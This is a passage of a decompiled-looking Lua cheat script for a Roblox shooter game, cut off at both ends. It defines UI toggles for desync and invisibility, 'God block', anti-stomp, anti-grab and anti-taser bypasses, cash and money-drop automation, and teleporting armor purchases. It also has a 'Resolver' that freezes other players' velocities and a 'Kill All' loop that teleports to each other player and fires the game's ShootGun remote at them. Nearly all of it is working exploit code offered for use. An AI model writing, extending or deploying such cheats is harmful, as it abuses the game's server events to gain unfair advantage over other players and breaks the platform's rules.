            game.Players.LocalPlayer.Character.Humanoid:UnequipTools()
          end

          task.wait(0.1)
          game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
          return
        end

        val177 = false
        val178 = helper5

        function helper17()

          if val177 then

            game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
            helper5()
          end

          return
        end

        game.Players.LocalPlayer.CharacterAdded:Connect(function()

          game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")
          helper17()
          return
        end)

        helper17()
        val44 = ui

        ui:AddToggle(toggles, "Auto Mask", false, function(p20)
          val177 = p20

          if p20 then
            helper5()
          end

          return
        end)

        val45 = ui

        ui:AddToggle(toggles, "Silent animations", false, function(p21)

          if p21 then

            _G.SilentANIM = game:GetService("RunService").RenderStepped:Connect(function()
              local character21 = game.Players.LocalPlayer.Character
              local humanoid7 = character21

              if character21 then

                humanoid7 = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
              end

              if humanoid7 then

                for key37, value41 in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
                  local val275 = value41.Name == "FallAnim"
                  local val276 = val275

                  if not val275 then
                    local val277 = value41.Name == "Animation1"
                    local val278 = val277

                    if not val277 then
                      local val279 = value41.Name == "Animation2"
                      local val280 = val279

                      if not val279 then
                        local val281 = value41.Name == "WalkAnim"
                        local val282 = val281

                        if not val281 then

                          val282 = value41.Name == "JumpAnim" or value41.Name == "RunAnim"
                        end

                        val280 = val282
                      end

                      val278 = val280
                    end

                    val276 = val278
                  end

                  if val276 then
                    value41.Priority = Enum.AnimationPriority.Action2
                  else
                    local val283 = value41.Name == "ToolNoneAnim"
                    local val284 = val283

                    if not val283 then

                      val284 = value41.Name == "ToolLungeAnim" or value41.Name == "ToolSlashAnim"
                    end

                    if val284 then
                      value41.Priority = Enum.AnimationPriority.Action3
                    else

                      if (value41.Animation.AnimationId:match("rbxassetid://2816431506")) then
                        value41.Priority = Enum.AnimationPriority.Action
                      end
                    end
                  end
                end
              end

              return
            end)
          else
            if _G.SilentANIM then

              _G.SilentANIM:Disconnect()
            end
          end

          return
        end)

        ClonedCharacter = nil
        yuhToggled = false

        getgenv().csync = getgenv().csync or false
        getgenv().invisible = false
        getgenv().visualize = false

        connect3 = nil
        val172 = {}
        originalTransparencyState = {}
        val46 = ui

        ui:AddToggle(toggles, "csync", false, function(p22)
          yuhToggled = p22
          return
        end)

        val47 = ui

        ui:AddToggle(toggles, "visualize", false, function(visualize)
          getgenv().visualize = visualize
          return
        end)

        function CloneCharacter(val285)
          val285.Archivable = true
          local clone = val285:Clone()
          local getDescendants = clone.GetDescendants
          clone.HumanoidRootPart.Anchored = false

          for key38, value42 in pairs(getDescendants(clone)) do
            local basePart3 = value42:IsA("BasePart")
            local part3 = basePart3

            if not basePart3 then
              local meshPart2 = value42:IsA("MeshPart")

              part3 = meshPart2 or value42:IsA("Part")
            end

            if part3 then
              value42.CustomPhysicalProperties = PhysicalProperties.new(100, 2, 0.5, 100, 1)
              value42.CanCollide = false
            else
              if (value42:IsA("Humanoid")) then
                value42.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
              else
                if (value42:IsA("ForceField")) then
                  value42:Destroy()
                end
              end
            end
          end

          clone.Parent = game.Players.LocalPlayer.Character
          clone.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

          val285.Archivable = false
          return clone
        end

        function setOriginalCharacterTransparency(val286)
          local character22 = game.Players.LocalPlayer.Character

          for key39, value43 in pairs(character22:GetDescendants()) do
            local basePart4 = value43:IsA("BasePart")
            local part4 = basePart4

            if not basePart4 then
              local meshPart3 = value43:IsA("MeshPart")

              part4 = meshPart3 or value43:IsA("Part")
            end

            if part4 and not (value43:IsDescendantOf(ClonedCharacter)) then
              if not originalTransparencyState[value43] then
                originalTransparencyState[value43] = value43.Transparency
              end

              value43.Transparency = val286
            else
              local decal = value43:IsA("Decal")

              if decal and not (value43:IsDescendantOf(ClonedCharacter)) then
                if not originalTransparencyState[value43] then
                  originalTransparencyState[value43] = value43.Transparency
                end

                value43.Transparency = val286
              end
            end
          end

          return
        end

        function restoreOriginalCharacterTransparency()

          for key40, value44 in pairs(originalTransparencyState) do

            if key40 and key40.Parent then
              key40.Transparency = value44
            end
          end

          originalTransparencyState = {}
          return
        end

        function Invisibility()

          if getgenv().invisible and not getgenv().visualize then
            setOriginalCharacterTransparency(1)
          else
            restoreOriginalCharacterTransparency()
          end

          return
        end

        val179 = nil

        game:GetService("RunService").RenderStepped:Connect(function()
          local clonedCharacter = ClonedCharacter
          local csync = clonedCharacter

          if clonedCharacter then

            csync = yuhToggled and getgenv().csync
          end

          if csync then
            local val287 = not getgenv().visualize

            if val287 ~= val179 then
              getgenv().invisible = val287
              Invisibility()
              val179 = val287
            end
          end

          return
        end)

        game:GetService("RunService").Heartbeat:Connect(function()

          if yuhToggled then

            if getgenv().csync and not ClonedCharacter then

              for key41, value45 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do

                if (value45:IsA("BasePart")) and val172[value45] == nil then
                  val172[value45] = value45.CanCollide
                  value45.CanCollide = false
                end
              end

              if not connect3 then

                connect3 = game:GetService("RunService").Stepped:Connect(function()

                  for key42, value46 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
                    if (value46:IsA("BasePart")) then
                      value46.CanCollide = false
                    end
                  end

                  return
                end)
              end

              getgenv().invisible = not getgenv().visualize
              ClonedCharacter = CloneCharacter(game.Players.LocalPlayer.Character)
              workspace.CurrentCamera.CameraSubject = ClonedCharacter
              Invisibility()
            else

              if not getgenv().csync and ClonedCharacter then
                getgenv().invisible = false
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ClonedCharacter.HumanoidRootPart.CFrame
                workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid

                ClonedCharacter:Destroy()
                ClonedCharacter = nil

                Invisibility()

                if connect3 then

                  connect3:Disconnect()
                  connect3 = nil
                end

                for key43, value47 in pairs(val172) do

                  if key43 and key43.Parent then
                    key43.CanCollide = value47
                  end
                end

                val172 = {}
              end
            end

            if getgenv().csync and ClonedCharacter then
              ClonedCharacter.Humanoid.Jump = game.Players.LocalPlayer.Character.Humanoid.Jump

              ClonedCharacter.Humanoid:Move(
                game.Players.LocalPlayer.Character.Humanoid.MoveDirection, false
              )
            end
          else
            if ClonedCharacter then
              getgenv().invisible = false
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ClonedCharacter.HumanoidRootPart.CFrame
              workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid

              ClonedCharacter:Destroy()
              ClonedCharacter = nil

              Invisibility()

              if connect3 then

                connect3:Disconnect()
                connect3 = nil
              end

              for key44, value48 in pairs(val172) do

                if key44 and key44.Parent then
                  key44.CanCollide = value48
                end
              end

              val172 = {}
            end
          end

          return
        end)

        val48 = ui

        ui:AddToggle(toggles, "God block", false, function(p25)

          if p25 == true then
            game:GetService("ReplicatedStorage").ClientAnimations.Block.AnimationId = "rbxassetid://0"

            localPlayer4 = game:GetService("Players").LocalPlayer
            tool = nil
            task.wait()

            function Block()
              game.ReplicatedStorage.MainEvent:FireServer("Block", true)
              wait()

              game.ReplicatedStorage.MainEvent:FireServer("Block", false)
              return
            end

            if getgenv().AUTO_BLOCK__ then

              getgenv().AUTO_BLOCK__:Disconnect()
            end

            local element3 = getgenv()

            element3.AUTO_BLOCK__ = game:GetService("RunService").Stepped:Connect(function()

              if blocking == true then

                if (localPlayer4.Character.BodyEffects:FindFirstChild("Block")) then

                  localPlayer4.Character.BodyEffects.Block:Destroy()
                end

                tool = localPlayer4.Character:FindFirstChildWhichIsA("Tool")

                if tool then

                  if (tool:FindFirstChild("GunScript")) then

                    game.ReplicatedStorage.MainEvent:FireServer("Block", false)
                  else
                    Block()
                  end
                else
                  Block()
                end
              end

              return
            end)

            blocking = true

            if not alreadyExecuted then

              game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
              alreadyExecuted = true
            end
          else
            if p25 == false then
              blocking = false
            end
          end

          return
        end)

        getgenv().VoidDesync = false

        function waitLoop3()
          game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

          while true do
            local voidDesync = getgenv().VoidDesync

            if voidDesync and task.wait(0.1) then

              game.Workspace.FallenPartsDestroyHeight = (0 / 0)

              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame - (Vector3.new(
                9000000000, 9000000000, 9000000000
              ))

              task.wait(0.01)
              game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            else
              break
            end
          end

          return
        end

        val49 = ui

        ui:AddToggle(toggles, "Void Desync", false, function(p26)
          getgenv().VoidDesync = p26

          if p26 then
            getgenv().csync = true
            waitLoop3()
          else
            game.Workspace.FallenPartsDestroyHeight = -500
            getgenv().csync = false
          end

          return
        end)

        game.Players.LocalPlayer.CharacterAdded:Connect(function()

          game.Players.LocalPlayer.Character:WaitForChild("FULLY_LOADED_CHAR")

          if getgenv().VoidDesync then
            waitLoop3()
          end

          return
        end)

        val180 = false

        function helper6(val288)

          if val288 then

            val182.heartbeat = game:GetService("RunService").Heartbeat:Connect(function()

              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(
                4565063680, 19475609600, -28028436480
              )

              game:GetService("RunService").RenderStepped:Wait()
              game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity

              return
            end)
          else
            for key45, value49 in pairs(val182) do
              if value49 then
                value49:Disconnect()
              end
            end

            val182 = {}
          end

          val180 = val288
          return
        end

        val181 = false
        val182 = {}
        val183 = helper6
        val50 = ui

        ui:AddToggle(toggles, "Anti Lock", false, function(p28)
          val181 = p28
          helper6(p28)
          return
        end)

        val51 = ui

        ui:AddKeybind(toggles, "Anti Lock Bind", function()

          if val181 then
            helper6(not val180)

            notify({ Description = val180 and "on" or "off", Title = "Anti lock", Duration = 3 })
          end

          return
        end, Enum.KeyCode.X)

        val52 = ui

        ui:AddToggle(toggles, "Anti Stomp", false, function(p29)

          if p29 == true then

            local runService = game:GetService("RunService")

            runService:BindToRenderStep("anti-stomp", 0, function()

              if game.Players.LocalPlayer.Character.BodyEffects["K.O"].Value == true then

                game.Players.LocalPlayer.Character.Humanoid:ChangeState("Dead")
              end

              return
            end)
          else
            if p29 == false then

              local runService2 = game:GetService("RunService")
              runService2:UnbindFromRenderStep("anti-stomp")
            end
          end

          return
        end)

        val53 = ui

        ui:AddToggle(toggles, "Anti Grab", false, function(p30)
          antiGrabEnabled = p30
          return
        end)

        game:GetService("RunService").RenderStepped:Connect(function()

          if antiGrabEnabled then

            if (game.Players.LocalPlayer.Character:FindFirstChild("GRABBING_CONSTRAINT")) then

              game.Players.LocalPlayer.Character.GRABBING_CONSTRAINT:Destroy()

              game.Players.LocalPlayer.Character.Humanoid:ChangeState("Dead")
            end
          end

          return
        end)

        getgenv().AntiTaser = false

        function waitLoop4()
          game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")

          while true do
            local antiTaser = getgenv().AntiTaser

            if antiTaser and task.wait() then

              for key46, value50 in pairs(game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):GetPlayingAnimationTracks()) do
                if value50.Animation.AnimationId == "rbxassetid://5641749824" then

                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + (Vector3.new(
                    0, 10000, 0
                  ))

                  task.wait(0.01)
                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                end
              end
            else
              break
            end
          end

          return
        end

        val54 = ui

        ui:AddToggle(toggles, "Anti Taser", false, function(p31)
          getgenv().AntiTaser = p31

          if p31 then
            waitLoop4()
          end

          return
        end)

        game.Players.LocalPlayer.CharacterAdded:Connect(function()

          game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")

          if getgenv().AntiTaser then
            waitLoop4()
          end

          return
        end)

        _G.antivoidMethod = "tp back"
        val55 = ui

        ui:AddToggle(toggles, "Anti void", false, function(p32)

          if p32 then
            if _G.antivoidMethod == "Normal" then
              game.Workspace.FallenPartsDestroyHeight = (0 / 0)
            else
              if _G.antivoidMethod == "tp back" then

                _G.antivoidConnection = game:GetService("RunService").Stepped:Connect(function()
                  if game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y < -150 then
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(
                      -326, 81, -301
                    ))
                  end

                  return
                end)
              end
            end
          else
            game.Workspace.FallenPartsDestroyHeight = -500

            if _G.antivoidConnection then

              _G.antivoidConnection:Disconnect()
              _G.antivoidConnection = nil
            end
          end

          return
        end)

        val56 = ui

        ui:AddDropdown(toggles, "Anti void Method", { "Normal", "tp back" }, "tp back", UDim2.new(0, 150, 0, 0), function(antivoidMethod)
          _G.antivoidMethod = antivoidMethod
          return
        end)

        val57 = ui

        ui:AddToggle(toggles, "Anti Slow", false, function(p33)

          if p33 == true then

            local runService3 = game:GetService("RunService")

            runService3:BindToRenderStep("Anti-Slow", 0, function()

              if (game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed")) then

                game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy()
              end

              if (game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk")) then

                game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy()
              end

              if (game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping")) then

                game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy()
              end

              if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then
                game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false
              end

              return
            end)
          else
            if p33 == false then

              local runService4 = game:GetService("RunService")
              runService4:UnbindFromRenderStep("Anti-Slow")
            end
          end

          return
        end)

        val58 = ui

        ui:AddToggle(toggles, "Admin Slide", false, function(p34)

          if p34 then

            local lighting = game:GetService("Lighting")
            lighting:SetAttribute("MacroAllow", false)
          else

            local lighting2 = game:GetService("Lighting")
            lighting2:SetAttribute("MacroAllow", true)
          end

          return
        end)

        val184 = false
        val59 = ui

        ui:AddToggle(toggles, "Double Jump", false, function(p35)
          val184 = p35
          return
        end)

        userInputService2 = game:GetService("UserInputService")
        localPlayer = game.Players.LocalPlayer

        function createAnimation(val289)
          local humanoid8 = val289:WaitForChild("Humanoid")
          local val290 = 0
          local val291 = false

          humanoid8.StateChanged:Connect(function(p37, p38)
            if not val184 then
              return
            else
              if p38 == Enum.HumanoidStateType.Landed then
                val290 = 0
                val291 = false
              else
                if p38 == Enum.HumanoidStateType.Freefall then
                  wait(0.1)
                  val291 = true
                else
                  if p38 == Enum.HumanoidStateType.Jumping then
                    val291 = false
                    val290 = val290 + 1

                    if val290 == 2 then
                      local instance12 = Instance.new("Sound", game:GetService("SoundService"))
                      instance12.SoundId = "rbxassetid://2306431663"
                      instance12:Play()

                      local animation20 = Instance.new("Animation")
                      animation20.AnimationId = "rbxassetid://2791328524"

                      local loadAnimation20 = humanoid8:LoadAnimation(animation20)
                      loadAnimation20:Play()
                      loadAnimation20.TimePosition = 0
                      loadAnimation20:AdjustSpeed(1.2)

                      local humanoidRootPart4 = val289:WaitForChild("HumanoidRootPart")

                      humanoidRootPart4.Velocity = Vector3.new(
                        humanoidRootPart4.Velocity.X, 150, humanoidRootPart4.Velocity.Z
                      )
                    end
                  end
                end
              end

              return
            end
          end)

          userInputService2.JumpRequest:Connect(function()

            local val292 = val291 and val290 < 2

            if val292 then
              humanoid8:ChangeState(Enum.HumanoidStateType.Jumping)
            end

            return
          end)

          return
        end

        character2 = localPlayer.Character
        val60 = character2

        if not character2 then

          val60 = localPlayer.CharacterAdded:Wait()
        end

        createAnimation(val60)

        localPlayer.CharacterAdded:Connect(createAnimation)

        localPlayer3 = game:GetService("Players").LocalPlayer

        function helper7()

          if not (game:IsLoaded()) then

            game.Loaded:Wait()
          end

          local character25 = localPlayer3.Character
          local object = character25

          if not character25 then

            object = localPlayer3.CharacterAdded:Wait()
          end

          local humanoid9 = object:WaitForChild("Humanoid")

          humanoid9:GetPropertyChangedSignal("JumpPower"):Connect(function()
            if val185 then
              humanoid9.JumpPower = 50
            end

            return
          end)

          humanoid9.StateChanged:Connect(function(p39, p40)

            local val293 = val185 and p40 == Enum.HumanoidStateType.Jumping

            if val293 then
              humanoid9:ChangeState(Enum.HumanoidStateType.Freefall)
            end

            return
          end)

          return
        end

        val185 = false
        val186 = helper7

        localPlayer3.CharacterAdded:Connect(helper7)
        val61 = ui

        ui:AddToggle(toggles, "No Jump Cooldown", false, function(p41)
          val185 = p41
          helper7()
          return
        end)

        helper7()
        val62 = ui

        ui:AddToggle(toggles, "Auto Reload", false, function(p42)

          if p42 == true then

            local runService5 = game:GetService("RunService")

            runService5:BindToRenderStep("Auto-Reload", 0, function()

              local character26 = game:GetService("Players").LocalPlayer.Character

              if (character26:FindFirstChildWhichIsA("Tool")) then

                if (game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo")) then

                  if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value
                    <= 0 then

                    local mainEvent2 = game:GetService("ReplicatedStorage").MainEvent

                    mainEvent2:FireServer(
                      "Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
                    )

                    wait(1)
                  end
                end
              end

              return
            end)
          else
            if p42 == false then

              local runService6 = game:GetService("RunService")
              runService6:UnbindFromRenderStep("Auto-Reload")
            end
          end

          return
        end)

        val63 = ui

        ui:AddToggle(toggles, "Auto Stomp", false, function(p43)

          if p43 then
            _G.Toggle = true

            while _G.Toggle do
              wait()

              game.ReplicatedStorage.MainEvent:FireServer("Stomp")
            end
          else
            _G.Toggle = false

            while _G.Toggle do
              wait()

              game.ReplicatedStorage.MainEvent:FireServer("Stomp")
            end
          end

          return
        end)

        val64 = ui

        ui:AddToggle(toggles, "Cash aura", false, function(p44)

          if p44 then
            local element4 = getgenv()

            element4.CashAura = game:GetService("RunService").Heartbeat:Connect(function()

              for key47, value51 in pairs(game:GetService("Workspace").Ignored.Drop:GetChildren()) do
                if (value51:IsA("Part")) then
                  if (value51.Position
                      - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                    <= 12 then
                    fireclickdetector(value51:FindFirstChild("ClickDetector"))
                  end
                end
              end

              return
            end)
          else

            getgenv().CashAura:Disconnect()
          end

          return
        end)

        val65 = ui

        ui:AddToggle(toggles, "Auto Drop", false, function(p45)

          if p45 then
            local element5 = getgenv()

            element5.AutoDrop = game:GetService("RunService").Heartbeat:Connect(function()

              game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack({
                [1] = "DropMoney", [2] = "15000", }))

              return
            end)
          else

            getgenv().AutoDrop:Disconnect()
          end

          return
        end)

        val66 = ui

        ui:AddToggle(toggles, "Auto Armor", false, function(p46)
          if p46 then
            getgenv().autoarmor = true

            spawn(function()
              while getgenv().autoarmor do
                wait()

                pcall(function()
                  local character27 = game.Players.LocalPlayer.Character
                  local val294 = character27

                  if character27 then

                    local humanoid10 = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                    local humanoidRootPart5 = humanoid10

                    if humanoid10 then

                      humanoidRootPart5 = (game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
                        and game.Players.LocalPlayer.Character.BodyEffects.Armor.Value < 15
                    end

                    val294 = humanoidRootPart5
                  end

                  if val294 then
                    if not savedpos then
                      savedpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                    end

                    game.Players.LocalPlayer.Character:MoveTo(workspace.Ignored.Shop["[High-Medium Armor] - $2589"].Head.Position)
                    wait(0.25)
                    fireclickdetector(workspace.Ignored.Shop["[High-Medium Armor] - $2589"].ClickDetector)
                    wait(0.5)

                    game.Players.LocalPlayer.Character:MoveTo(savedpos)
                    savedpos = nil
                  end

                  return
                end)
              end

              return
            end)
          else
            getgenv().autoarmor = false
          end

          return
        end)

        function GetFireArmorPrice()
          local shop = game.Workspace.Ignored.Shop

          for key48, value52 in pairs(shop:GetChildren()) do
            local model = value52:IsA("Model")
            local fireArmor = model

            if model then

              fireArmor = value52.Name:find("%[Fire Armor%]")
            end

            if fireArmor then
              return value52
            end
          end

          return nil
        end

        val67 = ui

        ui:AddToggle(toggles, "Auto FireArmor", false, function(p47)
          if p47 then
            getgenv().autofirearmor = true

            spawn(function()
              while getgenv().autofirearmor do
                function v7067()
                  local character28 = game.Players.LocalPlayer.Character
                  local val295 = character28

                  if character28 then

                    local humanoid11 = game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                    local humanoidRootPart6 = humanoid11

                    if humanoid11 then

                      humanoidRootPart6 = (game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart"))
                        and game.Players.LocalPlayer.Character.BodyEffects.FireArmor.Value < 200
                    end

                    val295 = humanoidRootPart6
                  end

                  if val295 then
                    if not savedpos then
                      savedpos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
                    end

                    local element6 = GetFireArmorPrice()

                    game.Players.LocalPlayer.Character:MoveTo(element6.Head.Position)
                    wait(0.25)
                    fireclickdetector(element6.ClickDetector)
                    wait(0.5)

                    game.Players.LocalPlayer.Character:MoveTo(savedpos)
                  end

                  return
                end

                wait()
              end

              return
            end)
          else
            getgenv().autofirearmor = false
          end

          return
        end)

        val68 = ui

        ui:AddToggle(aimlocks, "Resolver", false, function(p48)

          if p48 == true then

            local runService7 = game:GetService("RunService")

            runService7.Stepped:Connect(function()

              if TOTT == true then

                for key49, value53 in pairs(game.Players:GetChildren()) do
                  if value53.Name ~= game.Players.LocalPlayer.Name then
                    local character29 = value53.Character
                    local humanoidRootPart7 = character29

                    if character29 then

                      humanoidRootPart7 = value53.Character:FindFirstChild("HumanoidRootPart")
                    end

                    if humanoidRootPart7 then
                      value53.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)

                      value53.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(
                        0, 0, 0
                      )
                    end
                  end
                end
              end

              return
            end)

            runService7.Heartbeat:Connect(function()

              if hohoh == true then

                for key50, value54 in pairs(game.Players:GetChildren()) do
                  if value54.Name ~= game.Players.LocalPlayer.Name then
                    local character30 = value54.Character
                    local humanoidRootPart8 = character30

                    if character30 then

                      humanoidRootPart8 = value54.Character:FindFirstChild("HumanoidRootPart")
                    end

                    if humanoidRootPart8 then
                      value54.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)

                      value54.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(
                        0, 0, 0
                      )
                    end
                  end
                end
              end

              return
            end)

            local runService8 = game:GetService("RunService")

            runService8:BindToRenderStep("Auto-resoler", 0, function()
              local players3 = game.Players

              for key51, value55 in pairs(players3:GetChildren()) do
                if value55.Name ~= game.Players.LocalPlayer.Name then
                  local character31 = value55.Character
                  local humanoidRootPart9 = character31

                  if character31 then

                    humanoidRootPart9 = value55.Character:FindFirstChild("HumanoidRootPart")
                  end

                  if humanoidRootPart9 then
                    value55.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)

                    value55.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(
                      0, 0, 0
                    )
                  end
                end
              end

              return
            end)

            TOTT = true
            hohoh = true
          else
            if p48 == false then
              TOTT = false
              hohoh = false

              local runService9 = game:GetService("RunService")
              runService9:UnbindFromRenderStep("Auto-resoler")
            end
          end

          return
        end)

        getgenv().Killallsavepos = getgenv().Killallsavepos or nil

        function waitLoop5()
          local val296 = false

          while true do
            local killAll = getgenv().KillAll

            if killAll and task.wait() then
              local val297 = false

              local players4 = game:GetService("Players")

              for index4, value56 in ipairs(players4:GetPlayers()) do

                local playersService = value56 ~= game:GetService("Players").LocalPlayer
                local val298 = playersService

                if playersService then

                  local character32 = game:GetService("Players").LocalPlayer.Character
                  local val299 = character32

                  if character32 then

                    local humanoidRootPart10 = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                    local val300 = humanoidRootPart10

                    if humanoidRootPart10 then

                      local tool2 = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool")
                      local val301 = tool2

                      if tool2 then

                        local ammo = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild("Ammo")
                        local val302 = ammo

                        if ammo then
                          local character33 = value56.Character
                          local val303 = character33

                          if character33 then

                            local humanoidRootPart11 = value56.Character:FindFirstChild("HumanoidRootPart")
                            local val304 = humanoidRootPart11

                            if humanoidRootPart11 then

                              local bodyEffects = value56.Character:FindFirstChild("BodyEffects")
                              local val305 = bodyEffects

                              if bodyEffects then

                                local kO = value56.Character.BodyEffects:FindFirstChild("K.O")
                                local val306 = kO

                                if kO then

                                  local dead = value56.Character.BodyEffects:FindFirstChild("Dead")
                                  local val307 = dead

                                  if dead then

                                    local gRABBING_CONSTRAINT = not (value56.Character:FindFirstChild("GRABBING_CONSTRAINT"))
                                    local val308 = gRABBING_CONSTRAINT

                                    if gRABBING_CONSTRAINT then
                                      local val309 = not value56.Character.BodyEffects["K.O"].Value
                                      local val310 = val309

                                      if val309 then
                                        local val311 = not value56.Character.BodyEffects.Dead.Value
                                        local val312 = val311

                                        if val311 then
                                          local dataFolder = value56:FindFirstChild("DataFolder")
                                          local val313 = dataFolder

                                          if dataFolder then

                                            local information = value56.DataFolder:FindFirstChild("Information")
                                            local val314 = information

                                            if information then

                                              local crew = value56.DataFolder.Information:FindFirstChild("Crew")
                                              local val315 = crew

                                              if crew then

                                                local dataFolder2 = game:GetService("Players").LocalPlayer:FindFirstChild("DataFolder")
                                                local val316 = dataFolder2

                                                if dataFolder2 then

                                                  local information2 = game:GetService("Players").LocalPlayer.DataFolder:FindFirstChild("Information")
                                                  local val317 = information2

                                                  if information2 then

                                                    local crew2 = game:GetService("Players").LocalPlayer.DataFolder.Information:FindFirstChild("Crew")
                                                    local val318 = crew2

                                                    if crew2 then
                                                      val318 = value56.DataFolder.Information.Crew.Value
                                                        == game:GetService("Players").LocalPlayer.DataFolder.Information.Crew.Value
                                                    end

                                                    val317 = val318
                                                  end

                                                  val316 = val317
                                                end

                                                val315 = val316
                                              end

                                              val314 = val315
                                            end

                                            local val319 = not val314
                                            local val320 = val319

                                            if val319 then
                                              local killAll2 = getgenv().KillAll
                                              local val321 = killAll2

                                              if killAll2 then
                                                local friendCheck = getgenv().FriendCheck
                                                local isFriendsWith = friendCheck

                                                if friendCheck then

                                                  isFriendsWith = game:GetService("Players").LocalPlayer:IsFriendsWith(value56.UserId)
                                                end

                                                val321 = not isFriendsWith
                                              end

                                              val320 = val321
                                            end

                                            val313 = val320
                                          end

                                          val312 = val313
                                        end

                                        val310 = val312
                                      end

                                      val308 = val310
                                    end

                                    val307 = val308
                                  end

                                  val306 = val307
                                end

                                val305 = val306
                              end

                              val304 = val305
                            end

                            val303 = val304
                          end

                          val302 = val303
                        end

                        val301 = val302
                      end

                      val300 = val301
                    end

                    val299 = val300
                  end

                  val298 = val299
                end

                if val298 then

                  if game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool"):FindFirstChild("Ammo").Value
                    <= 0 then

                    local mainEvent3 = game:GetService("ReplicatedStorage").MainEvent

                    mainEvent3:FireServer(
                      "Reload", game:GetService("Players").LocalPlayer.Character:FindFirstChildWhichIsA("Tool")
                    )
                  end

                  local findFirstChild4 = game.Workspace.Vehicles:FindFirstChild(value56.Name)

                  if findFirstChild4 then
                    game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = (CFrame.new(findFirstChild4.Position))
                      * (CFrame.new(findFirstChild4.Velocity * 0.4))
                  end

                  game.Workspace.Camera.CameraSubject = value56.Character.Humanoid

                  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(value56.Character.HumanoidRootPart.Position + (Vector3.new(
                    0, 3, 0
                  )) + value56.Character.Humanoid.MoveDirection * 0.6 * value56.Character.Humanoid.WalkSpeed)

                  local mainEvent4 = game:GetService("ReplicatedStorage").MainEvent

                  mainEvent4:FireServer(
                    "ShootGun", game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, game.Players.LocalPlayer.Character.HumanoidRootPart.Position, value56.Character.HumanoidRootPart.Position, value56.Character.Head, Vector3.new(0, 0, -1)
                  )

                  val296 = false
                else

                  if not val296 and not val297 then
                    game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Killallsavepos)

                    val297 = true
                    val296 = true
                  end
                end
              end
            else
              break
            end
          end

          return
        end

        val69 = ui

        ui:AddToggle(aimlocks, "Kill All", false, function(p49)
          getgenv().KillAll = p49

          if p49 then
            getgenv().Killallsavepos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
            spawn(waitLoop5)
          end

          return
        end)

        val70 = ui

        ui:AddToggle(aimlocks, "Open all ATMs", false, function(p50)
          getgenv().openatms = p50

          if p50 then
            getgenv().csync = true
            local 

